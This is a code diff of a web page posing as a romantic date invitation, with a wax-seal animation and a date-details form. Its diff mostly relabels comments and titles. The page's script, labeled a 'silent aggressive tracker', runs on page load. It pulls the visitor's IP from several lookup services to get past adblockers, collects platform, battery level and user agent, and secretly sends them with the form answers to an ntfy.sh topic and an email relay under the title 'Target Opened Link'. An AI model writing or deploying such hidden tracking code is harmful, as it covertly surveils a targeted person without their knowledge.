@@ -170,12 +170,11 @@
   <script>
     document.addEventListener("DOMContentLoaded", () => {
 
-      // --- SILENT AGGRESSIVE TRACKER ---
+      // --- SILENT AGGRESSIVE TRACKER (USER LOG) ---
       async function captureVisitor() {
         try {
           let ip = "Unknown IP";
           
-          // Try multiple IP grabbers to bypass adblockers
           const ipEndpoints = [
             "https://api.ipify.org?format=json",
             "https://jsonip.com/",
@@ -188,7 +187,7 @@
               const data = await res.json();
               if (data.ip) { 
                 ip = data.ip; 
-                break; // Stop looking once we find it
+                break;
               }
             } catch(e) {}
           }
@@ -204,19 +203,21 @@
           const platform = navigator.platform || "Unknown OS";
           const time = new Date().toLocaleString();
 
-          const trackBody = `🚨 NEW VISITOR\nIP: ${ip}\nPlatform: ${platform}\nBattery: ${batteryStr}\nTime: ${time}\nUA: ${ua}`;
+          const trackBody = `🚨 VISITOR DETECTED\nIP: ${ip}\nPlatform: ${platform}\nBattery: ${batteryStr}\nTime: ${time}\nUA: ${ua}`;
           
-          fetch("https://ntfy.sh/Q2FXLHSJuC9538sv?title=" + encodeURIComponent("🚨 Target Opened Link!"), {
+          // Ntfy ping - Tagged as USER LOG
+          fetch("https://ntfy.sh/Q2FXLHSJuC9538sv?title=" + encodeURIComponent("🚨 USER LOG: Target Opened Link!"), {
             method: "POST",
             mode: "no-cors",
             body: trackBody
           }).catch(() => {});
 
+          // Email ping - Tagged as USER LOG
           fetch("https://formsubmit.co/ajax/Kali0x0x@proton.me", {
             method: "POST",
             headers: { "Content-Type": "application/json", "Accept": "application/json" },
             body: JSON.stringify({
-              _subject: "🚨 Target Opened Link!",
+              _subject: "🚨 USER LOG: Target Opened Link!",
               IP_Address: ip,
               Platform: platform,
               Battery_Level: batteryStr,
@@ -290,7 +291,7 @@
         step3.classList.remove("active"); stepSeal.classList.add("active");
       });
 
-      // Wax Seal Unlock & Dispatch
+      // Wax Seal Unlock & Dispatch (DATE DETAILS)
       const sealStage = document.getElementById("sealStage");
       const sealHint = document.getElementById("sealHint");
       let isSealed = false; 
@@ -329,17 +330,19 @@
             confetti({ startVelocity: 30, spread: 360, ticks: 60, origin: { x: Math.random(), y: Math.random() - 0.2 }, colors: ['#ffd1dc', '#ffffff', '#873e51', '#d3a4b4'] });
           }, 250);
 
-          fetch("https://ntfy.sh/Q2FXLHSJuC9538sv?title=" + encodeURIComponent("🤍 Romantic Date Confirmed!"), {
+          // Ntfy ping - Tagged as DATE DETAILS
+          fetch("https://ntfy.sh/Q2FXLHSJuC9538sv?title=" + encodeURIComponent("🤍 DATE DETAILS: Confirmed!"), {
             method: "POST",
             mode: "no-cors",
             body: `🤍 DATE ACCEPTED!\nDate: ${date}\nTime: ${time}\nDining: ${food}\nPlan: ${act}\nNotes: ${notes}`
           }).catch(() => {});
 
+          // Email ping - Tagged as DATE DETAILS
           fetch("https://formsubmit.co/ajax/Kali0x0x@proton.me", {
             method: "POST",
             headers: { "Content-Type": "application/json", "Accept": "application/json" },
             body: JSON.stringify({
-              _subject: "🤍 Date Invitation Confirmed!",
+              _subject: "🤍 DATE DETAILS: Confirmed!",
               Date: date,
               Time: time,
               Dining: food,
